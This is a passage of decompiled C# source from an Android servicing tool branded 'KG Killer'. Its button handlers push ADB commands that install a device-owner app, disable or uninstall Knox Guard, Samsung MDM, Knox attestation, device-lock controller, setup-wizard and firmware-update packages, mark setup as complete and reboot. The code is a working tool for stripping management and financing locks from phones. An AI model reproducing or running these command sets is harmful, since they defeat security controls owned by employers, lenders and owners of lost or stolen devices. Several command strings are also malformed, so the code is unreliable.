							this.progressBar1.Value = 0;
							props = null;
							f3 = null;
							adbCommands = null;
							list3 = null;
							process3 = null;
						}
						else
						{
							this.Logs(" Device not found", Color.Red);
						}
					}
					else
					{
						await this.WaitForDevices();
					}
				}
				catch (Exception ex2)
				{
					Console.WriteLine("Error: " + ex2.Message);
				}
				usernamee = null;
			}
			else
			{
				this.Logs("Operation Cancelled By User\r\n", Color.Red);
			}
		}

		// Token: 0x0600012B RID: 299 RVA: 0x0000B11C File Offset: 0x0000931C
		private async void button41_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Do You Want To Continue\n This Is Work Profile Method", "KG Killer", MessageBoxButtons.YesNo) != DialogResult.Yes)
			{
				this.Logs("Operation Cancelled BY User\r\n", Color.Red);
			}
			else
			{
				this.ResultTxt.Clear();
				string usernamee = Form3.usrname;
				this.Logs("\nUser : ", Color.FloralWhite);
				this.Logs(usernamee, Color.OrangeRed);
				this.Logs("\nOperation :", Color.FloralWhite);
				this.Logs("IT Admin Android 15 (Work Profile) \n", Color.Gold);
				try
				{
					this.Logs("\nChecking ADB Server..", Color.FloralWhite);
					await Task.Delay(100);
					if (!this.CheckRunAdb())
					{
						TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
						if (!taskAwaiter.IsCompleted)
						{
							await taskAwaiter;
							TaskAwaiter taskAwaiter2;
							taskAwaiter = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter.GetResult();
					}
					else
					{
						this.Logs(" Running\n", Color.Green);
						TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
						TaskAwaiter taskAwaiter2;
						if (!taskAwaiter3.IsCompleted)
						{
							await taskAwaiter3;
							taskAwaiter3 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter3.GetResult();
						this.Logs("Searching devices..\n", Color.FloralWhite);
						await Task.Delay(10);
						this.progressBar1.Value = 10;
						if (this.CariAdbDevice())
						{
							TaskAwaiter taskAwaiter4 = Task.Delay(10).GetAwaiter();
							if (!taskAwaiter4.IsCompleted)
							{
								await taskAwaiter4;
								taskAwaiter4 = taskAwaiter2;
								taskAwaiter2 = default(TaskAwaiter);
							}
							taskAwaiter4.GetResult();
							this.adbclients.SetDevice(this.SnAdb);
							Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
							try
							{
								this.Logs("Model  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.model"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Brand➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.brand"], Color.Red);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.incremental"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Build date  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.date"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Security patch  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.security_patch"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Android version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.release"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.progressBar1.Value = 20;
							}
							catch (Exception ex)
							{
								Console.WriteLine("Error: " + ex.Message);
							}
							this.Logs("Checking IT Admin :", Color.FloralWhite);
							await Task.Delay(6000);
							this.Logs(" OK\n", Color.Green);
							await Task.Delay(2000);
							await Task.WhenAll(new Task[]
							{
								Task.Delay(2000),
								Task.Run(delegate
								{
									this.InstallApk("dpc.apk", "install");
								}),
								Task.Delay(500)
							});
							Adb.AdbCommand("shell am start -n com.afwsamples.testdpc/com.afwsamples.testdpc.SetupManagementLaunchActivity");
							MessageBox.Show("Setup Work Profile And Continue", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
							this.progressBar1.Value = 40;
							this.Logs("Deleting APKs:", Color.FloralWhite);
							string[] adbCommands = new string[]
							{
								"adb shell dpm set-device-owner com.afwsamples.testdpc/.DeviceAdminReceiver", "pm disable-user --user 0 com.google.android.overlay.gmsconfig.asi", "pm disable-user --user 0 com.google.android.overlay.gmsconfig.common", "pm disable-user --user 0 com.google.android.overlay.gmsconfig.comms", "pm disable-user --user 0 com.google.android.overlay.gmsconfig.gsa", "pm disable-user --user 0 com.google.android.overlay.gmsconfig.searchselector", "pm disable-user --user 0 com.oplus.android.overlay.gmsconfig.common", "pm disable-user --user 0 com.google.android.gms.location.histor", "pm disable-user --user 0 com.google.android.gms", "pm clear --user 0 com.google.android.overlay.gmsconfig.asi",
								"pm clear --user 0 com.google.android.overlay.gmsconfig.common", "pm clear --user 0 com.google.android.overlay.gmsconfig.comms", "pm clear --user 0 com.google.android.overlay.gmsconfig.gsa", "pm clear --user 0 com.google.android.overlay.gmsconfig.searchselector", "pm clear --user 0 com.oplus.android.overlay.gmsconfig.common", "pm clear --user 0 com.google.android.gms.location.history", "pm clear --user 0 com.google.android.gms", "pm disable-user --user 0 com.google.android.ondevicepersonalization.services", "pm disable-user --user 0 com.google.android.server.deviceconfig.resources", "pm disable-user --user 0 com.oplus.framework.rro.devicecase",
								"pm disable-user --user 0 com.android.companiondevicemanager", "pm disable-user --user 0 com.oplus.dfs", "pm disable-user --user 0 com.google.ambient.streaming", "pm disable-user --user 0 android.autoinstalls.config.oppo", "pm disable-user --user 0 com.android.devicelockcontroller", "pm disable com.android.devicelockcontroller", "pm disable-user --user 0 com.android.DeviceAsWebcam", "pm clear --user 0 com.google.android.ondevicepersonalization.services", "pm clear --user 0 com.google.android.server.deviceconfig.resources", "pm clear --user 0 com.oplus.framework.rro.devicecase",
								"pm clear --user 0 com.android.companiondevicemanager", "pm clear --user 0 com.oplus.dfs", "pm clear --user 0 com.google.ambient.streaming", "pm clear --user 0 android.autoinstalls.config.oppo", "pm clear --user 0 com.android.devicelockcontroller", "pm clear --user 0 com.android.DeviceAsWebcam", "pm disable-user --user 0 com.google.android.apps.wellbeing", "pm clear --user 0 com.google.android.apps.wellbeing", "pm disable-user --user 0 com.google.android.partnersetup", "pm clear --user 0 com.google.android.partnersetup",
								"pm disable-user --user 0 com.google.android.dialer", "pm disable-user --user 0 com.android.phone", "pm clear --user 0 com.google.android.dialer", "pm clear --user 0 com.android.phone", "pm disable-user --user 0 com.google.android.setupwizard", "pm clear --user 0 com.google.android.setupwizard", "pm disable-user --user 0 com.google.android.apps.tachyon", "pm clear --user 0 com.google.android.apps.tachyon", "pm disable-user --user 0 com.google.android.onetimeinitializer", "pm clear --user 0 com.google.android.onetimeinitializer",
								"pm disable-user --user 0 com.oplus.pscanvas", "pm clear --user 0 com.oplus.pscanvas", "pm disable-user --user 0 com.google.android.calendar", "pm disable-user --user 0 com.android.providers.calendar", "pm clear --user 0 com.google.android.calendar", "pm clear --user 0 com.android.providers.calendar", "pm disable-user --user 0 com.google.android.apps.setupwizard.searchselector", "pm clear --user 0 com.google.android.apps.setupwizard.searchselector", "pm disable-user --user 0 com.android.nfc", "pm clear --user 0 com.android.nfc",
								"pm disable-user --user 0 com.google.android.gsf", "pm clear --user 0 com.google.android.gsf", "pm disable-user --user 0 com.google.android.safetycenter.resources", "pm clear --user 0 com.google.android.safetycenter.resources"
							};
							await Task.Delay(5000);
							this.Logs(" OK\n", Color.Green);
							this.progressBar1.Value = 50;
							this.Logs("IT Admin Removing:", Color.FloralWhite);
							await Task.Delay(1000);
							foreach (string command in adbCommands)
							{
								this.adbclients.ExecuteRemoteCommand(command);
								command = null;
							}
							string[] array = null;
							this.Logs(" OK\n", Color.Green);
							this.Logs("Rebooting :", Color.FloralWhite);
							List<string> list3 = new List<string> { "reboot" };
							this.progressBar1.Value = 80;
							Process process3 = ShellController.CreateShellProcess();
							foreach (string command2 in list3)
							{
								string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
								output = this.CustomizeOutput(output);
								output = null;
								command2 = null;
							}
							List<string>.Enumerator enumerator = default(List<string>.Enumerator);
							ShellController.CloseShellProcess(process3);
							this.progressBar1.Value = 80;
							this.progressBar1.Value = 90;
							this.Logs(" Ok\n", Color.Green);
							string text = await this.<button41_Click>g__GetWaitForDevicesResultAsync|120_1();
							string result = text + "\n";
							text = null;
							this.progressBar1.Value = 100;
							this.Logs("\nIT Admin Removed SucessFully BY KG Killer\n\r", Color.Gold);
							this.progressBar1.Value = 0;
							props = null;
							adbCommands = null;
							list3 = null;
							process3 = null;
						}
						else
						{
							this.Logs(" Device not found", Color.Red);
						}
					}
				}
				catch (Exception ex2)
				{
					Console.WriteLine("Error: " + ex2.Message);
				}
				usernamee = null;
			}
		}

		// Token: 0x0600012C RID: 300 RVA: 0x0000B164 File Offset: 0x00009364
		private async void button42_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Do You Want To Continue", "KG Killer", MessageBoxButtons.YesNo) != DialogResult.Yes)
			{
				this.Logs("Operation Cancelled BY User\r\n", Color.Red);
			}
			else
			{
				this.ResultTxt.Clear();
				string usernamee = Form3.usrname;
				this.Logs("\nUser :", Color.FloralWhite);
				this.Logs(usernamee, Color.OrangeRed);
				this.Logs("\nOperation :", Color.FloralWhite);
				this.Logs("Samsung MDM (All Patch) \n", Color.Gold);
				try
				{
					this.Logs("\nChecking ADB Server..", Color.FloralWhite);
					await Task.Delay(100);
					if (this.CheckRunAdb())
					{
						this.Logs(" Running\n", Color.Green);
						TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
						TaskAwaiter taskAwaiter2;
						if (!taskAwaiter.IsCompleted)
						{
							await taskAwaiter;
							taskAwaiter = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter.GetResult();
						this.Logs("Searching devices..\n", Color.FloralWhite);
						await Task.Delay(10);
						this.progressBar1.Value = 10;
						if (this.CariAdbDevice())
						{
							TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
							if (!taskAwaiter3.IsCompleted)
							{
								await taskAwaiter3;
								taskAwaiter3 = taskAwaiter2;
								taskAwaiter2 = default(TaskAwaiter);
							}
							taskAwaiter3.GetResult();
							this.adbclients.SetDevice(this.SnAdb);
							Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
							try
							{
								this.Logs("Model  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.model"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Brand  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.brand"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("CPU  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.board"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.incremental"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Build date  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.date"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Security patch  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.security_patch"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Android version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.release"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Android SDK  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.sdk"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("KG STATUS➾ ", Color.FloralWhite);
								this.Logs(props["knox.kg.state"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.progressBar1.Value = 20;
							}
							catch (Exception ex)
							{
								Console.WriteLine("Error: " + ex.Message);
							}
							this.Logs("Checking MDM :", Color.FloralWhite);
							this.Logs(" OK\n", Color.Green);
							await Task.Delay(100);
							this.progressBar1.Value = 40;
							this.Logs("Deleting Files :", Color.FloralWhite);
							string[] adbCommands = new string[]
							{
								"pm uninstall -k --user 0 com.sec.knox.bridge", "pm uninstall -k --user 0 com.sec.knox.switchknoxll", "pm uninstall -k --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "pm uninstall --user 0 com.samsung.android.knox.pushmanager", "pm uninstall -k --user 0 com.sec.knox.switcher", "pm uninstall -k --user 0 com.samsung.android.mdm", "pm uninstall -k --user 0 com.samsung.android.securityResultTxtagent", "am force-stop com.sec.knox.knoxsetupwizardclient", "pm uninstall --user 0 com.sec.enterprise.mdm.services.simpin", "pm uninstall --user 0 com.samsung.android.mdm",
								"pm uninstall --user 0 com.samsung.knox.securefolder"
							};
							await Task.Delay(1000);
							this.Logs(" OK\n", Color.Green);
							this.progressBar1.Value = 50;
							this.Logs("MDM Removed :", Color.FloralWhite);
							await Task.Delay(1500);
							foreach (string command in adbCommands)
							{
								this.adbclients.ExecuteRemoteCommand(command);
								command = null;
							}
							string[] array = null;
							List<string> list3 = new List<string> { "reboot" };
							this.progressBar1.Value = 80;
							Process process3 = ShellController.CreateShellProcess();
							foreach (string command2 in list3)
							{
								string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
								output = this.CustomizeOutput(output);
								output = null;
								command2 = null;
							}
							List<string>.Enumerator enumerator = default(List<string>.Enumerator);
							ShellController.CloseShellProcess(process3);
							this.progressBar1.Value = 80;
							this.Logs(" Ok\n", Color.Green);
							this.progressBar1.Value = 90;
							string text = await this.<button42_Click>g__GetWaitForDevicesResultAsync|121_0();
							string result = text + "\n";
							text = null;
							this.progressBar1.Value = 100;
							this.Logs("\nMDM Removed SucessFully KG Killer\n\r", Color.Gold);
							this.progressBar1.Value = 0;
							props = null;
							adbCommands = null;
							list3 = null;
							process3 = null;
						}
						else
						{
							this.Logs(" Device not found", Color.Red);
						}
					}
					else
					{
						await this.WaitForDevices();
					}
				}
				catch (Exception ex2)
				{
					Console.WriteLine("Error: " + ex2.Message);
				}
				usernamee = null;
			}
		}

		// Token: 0x0600012D RID: 301 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void tabPage5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600012E RID: 302 RVA: 0x0000B1AC File Offset: 0x000093AC
		private async void button43_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Do You Want To Continue", "KG Killer", MessageBoxButtons.YesNo) != DialogResult.Yes)
			{
				this.Logs("Operation Cancelled BY User\r\n", Color.Red);
			}
			else
			{
				this.ResultTxt.Clear();
				MessageBox.Show("If You Fail Then Try Again Same Process", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				string usernamee = Form3.usrname;
				this.Logs("\nUser :", Color.FloralWhite);
				this.Logs(usernamee, Color.OrangeRed);
				this.Logs("\nOperation:", Color.FloralWhite);
				this.Logs("IT Admin (Hyper OS )\n", Color.Gold);
				try
				{
					this.Logs("\nChecking ADB Server..", Color.FloralWhite);
					await Task.Delay(100);
					if (!this.CheckRunAdb())
					{
						TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
						if (!taskAwaiter.IsCompleted)
						{
							await taskAwaiter;
							TaskAwaiter taskAwaiter2;
							taskAwaiter = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter.GetResult();
					}
					else
					{
						this.Logs(" Running\n", Color.Green);
						TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
						TaskAwaiter taskAwaiter2;
						if (!taskAwaiter3.IsCompleted)
						{
							await taskAwaiter3;
							taskAwaiter3 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter3.GetResult();
						this.Logs("Searching devices..\n", Color.FloralWhite);
						await Task.Delay(10);
						this.progressBar1.Value = 10;
						if (this.CariAdbDevice())
						{
							TaskAwaiter taskAwaiter4 = Task.Delay(10).GetAwaiter();
							if (!taskAwaiter4.IsCompleted)
							{
								await taskAwaiter4;
								taskAwaiter4 = taskAwaiter2;
								taskAwaiter2 = default(TaskAwaiter);
							}
							taskAwaiter4.GetResult();
							this.adbclients.SetDevice(this.SnAdb);
							Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
							try
							{
								this.Logs("Model  : ", Color.FloralWhite);
								this.Logs(props["ro.product.model"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Brand: ", Color.FloralWhite);
								this.Logs(props["ro.product.brand"], Color.Red);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Version  : ", Color.FloralWhite);
								this.Logs(props["ro.build.version.incremental"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Build date  : ", Color.FloralWhite);
								this.Logs(props["ro.build.date"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Security patch  : ", Color.FloralWhite);
								this.Logs(props["ro.build.version.security_patch"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Android version  : ", Color.FloralWhite);
								this.Logs(props["ro.build.version.release"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.progressBar1.Value = 20;
							}
							catch (Exception ex)
							{
								Console.WriteLine("Error: " + ex.Message);
							}
							this.Logs("Checking IT Admin :", Color.FloralWhite);
							this.Logs(" OK\n", Color.Green);
							await Task.Delay(100);
							this.progressBar1.Value = 40;
							this.Logs("Deleting APKs:", Color.FloralWhite);
							string[] adbCommands = new string[] { "pm disable-user --user 0 com.android.nfc\r\n", "pm disable-user --user 0 com.google.android.gms.supervision", "pm disable-user --user 0 com.google.android.gms.supervision", "pm disable-user --user 0 com.google.android.gsf", "pm disable-user --user 0 com.mi.global.shop", "pm disable-user --user 0 com.xiaomi.mipicks", "pm disable-user --user 0 com.google.android.gsf\r\nPackage com.google.android.gsf new state: disabled-user" };
							await Task.Delay(1000);
							this.Logs(" OK\n", Color.Green);
							this.progressBar1.Value = 50;
							this.Logs("MDM Removed :", Color.FloralWhite);
							await Task.Delay(1500);
							foreach (string command in adbCommands)
							{
								this.adbclients.ExecuteRemoteCommand(command);
								command = null;
							}
							string[] array = null;
							List<string> list3 = new List<string> { "reboot" };
							this.progressBar1.Value = 80;
							Process process3 = ShellController.CreateShellProcess();
							foreach (string command2 in list3)
							{
								string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
								output = this.CustomizeOutput(output);
								output = null;
								command2 = null;
							}
							List<string>.Enumerator enumerator = default(List<string>.Enumerator);
							ShellController.CloseShellProcess(process3);
							this.progressBar1.Value = 80;
							this.Logs(" Ok\n", Color.Green);
							this.progressBar1.Value = 90;
							string text = await this.<button43_Click>g__GetWaitForDevicesResultAsync|123_0();
							string result = text + "\n";
							text = null;
							this.progressBar1.Value = 100;
							this.Logs("\nIT Admin Removed SucessFully KG Killer\n\r", Color.Gold);
							this.progressBar1.Value = 0;
							props = null;
							adbCommands = null;
							list3 = null;
							process3 = null;
						}
						else
						{
							this.Logs(" Device not found", Color.Red);
						}
					}
				}
				catch (Exception ex2)
				{
					Console.WriteLine("Error: " + ex2.Message);
				}
				usernamee = null;
			}
		}

		// Token: 0x0600012F RID: 303 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void panel2_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000130 RID: 304 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void lblExpiryDate_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000131 RID: 305 RVA: 0x0000B1F4 File Offset: 0x000093F4
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.lblDate.Text = DateTime.Now.ToString("d/MM/yyyy") + "  " + DateTime.Now.ToString("HH:mm:ss");
		}

		// Token: 0x06000132 RID: 306 RVA: 0x0000B23C File Offset: 0x0000943C
		private async void button44_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Do You Want To Continue", "KG Killer", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				this.ResultTxt.Clear();
				string usernamee = Form3.usrname;
				this.Logs("\nUser : ", Color.FloralWhite);
				this.Logs(usernamee, Color.OrangeRed);
				this.Logs("\nOperation :", Color.FloralWhite);
				this.Logs("Samsung Knox Disable (All Patch) \n", Color.Gold);
				try
				{
					this.Logs("\nChecking ADB Server..", Color.FloralWhite);
					await Task.Delay(100);
					if (!this.CheckRunAdb())
					{
						TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
						if (!taskAwaiter.IsCompleted)
						{
							await taskAwaiter;
							TaskAwaiter taskAwaiter2;
							taskAwaiter = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter.GetResult();
					}
					else
					{
						this.Logs(" Running\n", Color.Green);
						TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
						TaskAwaiter taskAwaiter2;
						if (!taskAwaiter3.IsCompleted)
						{
							await taskAwaiter3;
							taskAwaiter3 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter3.GetResult();
						this.Logs("Searching devices..\n", Color.FloralWhite);
						await Task.Delay(10);
						this.progressBar1.Value = 10;
						if (this.CariAdbDevice())
						{
							TaskAwaiter taskAwaiter4 = Task.Delay(10).GetAwaiter();
							if (!taskAwaiter4.IsCompleted)
							{
								await taskAwaiter4;
								taskAwaiter4 = taskAwaiter2;
								taskAwaiter2 = default(TaskAwaiter);
							}
							taskAwaiter4.GetResult();
							this.adbclients.SetDevice(this.SnAdb);
							Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
							try
							{
								this.Logs("Model  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.model"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Brand➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.brand"], Color.Red);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.incremental"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Build date  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.date"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Security patch  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.security_patch"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Android version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.release"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.progressBar1.Value = 20;
							}
							catch (Exception ex)
							{
								Console.WriteLine("Error: " + ex.Message);
							}
							this.Logs("Checking Knox :", Color.FloralWhite);
							await Task.Delay(6000);
							this.Logs(" OK\n", Color.Green);
							await Task.Delay(2000);
							this.progressBar1.Value = 40;
							this.Logs("Deleting APKs:", Color.FloralWhite);
							string[] adbCommands = new string[]
							{
								"shell pm disable-user com.sec.enterprise.knox.cloudmdm.smdms", "Shell pm disable-user --user 0  com.sec.enterprise.knox.cloudmdm.smdms", "shell pm disable com.sec.enterprise.knox.cloudmdm.smdms", "shell pm uninstall -k --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "shell pm disable-user com.samsung.android.knox.containercore", "shell pm disable-user --user 0 com.samsung.android.knox.containercore", "shell pm disable com.samsung.android.knox.containercore ", "shell pm uninstall -k --user 0 com.samsung.android.knox.containercore ", "shell pm uninstall --user 0 com.samsung.android.knox.containercore ",
								"shell pm disable-user com.sec.enterprise.knox.attestation", "shell pm disable-user --user 0 com.sec.enterprise.knox.attestation", "shell pm disable com.sec.enterprise.knox.attestation", "shell pm uninstall -k --user 0 com.sec.enterprise.knox.attestation", "shell pm uninstall --user 0 com.sec.enterprise.knox.attestation", "shell pm disable-user com.samsung.android.knox.containeragent", "shell pm disable-user --user 0 com.samsung.android.knox.containeragent", "shell pm disable com.samsung.android.knox.containeragent", "shell pm uninstall -k --user 0 com.samsung.android.knox.containeragent", "shell pm uninstall --user 0 com.samsung.android.knox.containeragent",
								"shell pm disable-user com.samsung.knox.keychain", "shell pm disable-user --user 0 com.samsung.knox.keychain", "shell pm disable ", "shell pm uninstall -k --user 0 com.samsung.knox.keychain", "shell pm uninstall --user 0 com.samsung.knox.keychain", "shell pm disable-user com.samsung.android.knox.analytics.uploader", "shell pm disable-user --user 0 com.samsung.android.knox.analytics.uploader", "shell pm disable com.samsung.android.knox.analytics.uploader", "shell pm uninstall -k --user 0 com.samsung.android.knox.analytics.uploader", "shell pm uninstall --user 0 com.samsung.android.knox.analytics.uploader",
								"shell pm disable-user com.knox.vpn.proxyhandler", "shell pm disable-user --user 0 com.knox.vpn.proxyhandler", "shell pm disable com.knox.vpn.proxyhandler", "shell pm uninstall -k --user 0 com.knox.vpn.proxyhandler", "shell pm uninstall --user 0 com.knox.vpn.proxyhandler", "shell pm disable-user com.sec.android.app.setupwizardlegalprovider", "shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider", "shell pm disable com.sec.android.app.setupwizardlegalprovider", "shell pm uninstall -k --user 0 com.sec.android.app.setupwizardlegalprovider", "shell pm uninstall --user 0 com.sec.android.app.setupwizardlegalprovider",
								"shell pm disable-user com.samsung.android.easysetup", "shell pm disable-user --user 0 com.samsung.android.easysetup", "shell pm disable ", "shell pm uninstall -k --user 0 com.samsung.android.easysetup", "shell pm uninstall --user 0 com.samsung.android.easysetup", "shell pm disable-user com.google.android.partnersetup", "shell pm disable-user --user 0 com.google.android.partnersetup", "shell pm disable com.google.android.partnersetup", "shell pm uninstall -k --user 0 com.google.android.partnersetup", "shell pm uninstall --user 0 com.google.android.partnersetup",
								"shell pm disable-user com.sec.android.soagent", "shell pm disable-user --user 0 com.sec.android.soagent", "shell pm disable com.sec.android.soagent", "shell pm uninstall -k --user 0 com.sec.android.soagent", "shell pm uninstall --user 0 com.sec.android.soagent"
							};
							await Task.Delay(5000);
							this.Logs(" OK\n", Color.Green);
							this.progressBar1.Value = 50;
							this.Logs("Removing Knox :", Color.FloralWhite);
							await Task.Delay(1000);
							foreach (string command in adbCommands)
							{
								this.adbclients.ExecuteRemoteCommand(command);
								command = null;
							}
							string[] array = null;
							this.Logs(" OK\n", Color.Green);
							this.Logs("Finalizing :", Color.FloralWhite);
							List<string> list3 = new List<string>
							{
								"shell pm disable-user com.wssyncmldm", "shell pm disable-user --user 0 com.wssyncmldm", "shell pm disable com.wssyncmldm", "shell pm uninstall -k --user 0 com.wssyncmldm", "shell pm uninstall --user 0 com.wssyncmldm", "shell pm disable-user com.wssyncmldm", "shell pm disable-user --user 0 com.wssyncmldm", "shell pm disable com.wssyncmldm", "shell pm uninstall -k --user 0 com.wssyncmldm", "shell pm uninstall --user 0 com.wssyncmldm",
								"shell pm uninstall -k --user 0 com.LocalFota", "shell pm uninstall --user 0 com.LocalFota", "shell pm uninstall -k --user 0 com.samsung.syncmlservice", "shell pm uninstall --user 0 com.samsung.syncmlservice", "shell pm uninstall -k --user 0 com.sec.android.fotaclient", "shell pm uninstall --user 0 com.sec.android.fotaclient", "shell pm uninstall -k --user 0 com.sec.android.fwupgrade", "shell pm uninstall --user 0 com.sec.android.fwupgrade", "shell pm uninstall -k --user 0 com.sprint.w.installer", "shell pm uninstall --user 0 com.sprint.w.installer",
								"shell pm uninstall -k --user 0 com.sprint.zone", "shell pm uninstall --user 0 com.sprint.zone", "shell pm uninstall -k --user 0 com.ws.dm", "shell pm uninstall --user 0 com.ws.dm", "shell pm uninstall -k --user 0 ", "shell pm uninstall --user 0 com.wssyncmldm", "shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1", "shell pm disable-user --user 0 com.sec.android.app.setupwizard", "shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider", "shell pm disable-user --user 0 com.sec.android.app.SecSetupWizard",
								"reboot"
							};
							this.progressBar1.Value = 80;
							Process process3 = ShellController.CreateShellProcess();
							foreach (string command2 in list3)
							{
								string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
								output = this.CustomizeOutput(output);
								output = null;
								command2 = null;
							}
							List<string>.Enumerator enumerator = default(List<string>.Enumerator);
							ShellController.CloseShellProcess(process3);
							this.Logs(" Done\n", Color.Green);
							this.progressBar1.Value = 80;
							this.progressBar1.Value = 90;
							this.Logs("Rebooting :", Color.FloralWhite);
							this.Logs(" Ok\n", Color.Green);
							string text = await this.<button44_Click>g__GetWaitForDevicesResultAsync|127_0();
							string result = text + "\n";
							text = null;
							this.progressBar1.Value = 100;
							this.Logs("\nPlease Do Not Reset Or Update Phone\n", Color.OrangeRed);
							this.Logs("Knox Disabled SucessFully BY KG Killer\n\r", Color.Gold);
							this.progressBar1.Value = 0;
							props = null;
							adbCommands = null;
							list3 = null;
							process3 = null;
						}
						else
						{
							this.Logs(" Device not found", Color.Red);
						}
					}
				}
				catch (Exception ex2)
				{
					Console.WriteLine("Error: " + ex2.Message);
				}
				usernamee = null;
			}
			else
			{
				this.Logs("Operation Cancelled BY User\r\n", Color.Red);
			}
		}

		// Token: 0x06000137 RID: 311 RVA: 0x00010B14 File Offset: 0x0000ED14
		[CompilerGenerated]
		private async Task<string> <KgBtn_Click>g__GetWaitForDevicesResultAsync|32_2()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x06000138 RID: 312 RVA: 0x00010B58 File Offset: 0x0000ED58
		[CompilerGenerated]
		private async Task<string> <button2_Click>g__GetWaitForDevicesResultAsync|46_0()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x0600013D RID: 317 RVA: 0x00010C1C File Offset: 0x0000EE1C
		[CompilerGenerated]
		private async Task<string> <button1_Click>g__GetWaitForDevicesResultAsync|54_4()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x06000140 RID: 320 RVA: 0x00010CA0 File Offset: 0x0000EEA0
		[CompilerGenerated]
